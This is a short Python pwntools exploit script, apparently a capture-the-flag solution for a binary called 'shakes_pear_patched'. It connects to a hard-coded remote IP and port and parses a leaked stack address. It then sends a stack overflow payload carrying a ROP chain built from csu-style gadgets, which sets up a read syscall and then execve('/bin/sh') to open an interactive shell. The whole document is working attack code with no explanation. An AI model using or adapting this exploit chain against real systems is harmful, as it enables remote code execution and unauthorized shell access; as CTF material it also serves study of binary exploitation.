#!/usr/bin/env python3

from pwn import *

exe = ELF("./shakes_pear_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def set_regs(rdi, rsi, rdx, stack):
    rop = b""
    rop += p64(0x4006ea)
    rop += p64(0) # rbx
    rop += p64(1) #rbp
    rop += p64(stack + 8) #r12
    rop += p64(rdi)
    rop += p64(rsi)
    rop += p64(rdx)
    rop += p64(0x4006d0)
    rop += p64(0)*7
    rop += p64(0x00000000004006f3)
    rop += p64(rdi)
  
    return rop

def main():
    #r = conn()
    r = remote("198.211.116.222",9004)

    r.recvuntil("Pwny lives here ")
    stack = int(r.recv(14), 16)
    log.warn("stack leak @ 0x%x", stack)

    syscall     = 0x00000000004005fb
    pop_rdi     = 0x00000000004006f3
    pop_rsi_r15 = 0x00000000004006f1
    
    payload = b"/bin/sh\x00"
    payload += p64(0x040068f)
    payload += b"M"*0x68
    payload += set_regs(0, exe.bss(0x100), 0x3b, stack)
    payload += p64(syscall)
    payload += set_regs(stack, 0, 0, stack)
    payload += p64(syscall)

    pause()
    r.recvline()
    r.sendline(payload)
    
    pause()
    r.sendline(b"A"*0x3b)

    r.interactive()


if __name__ == "__main__":
    main()
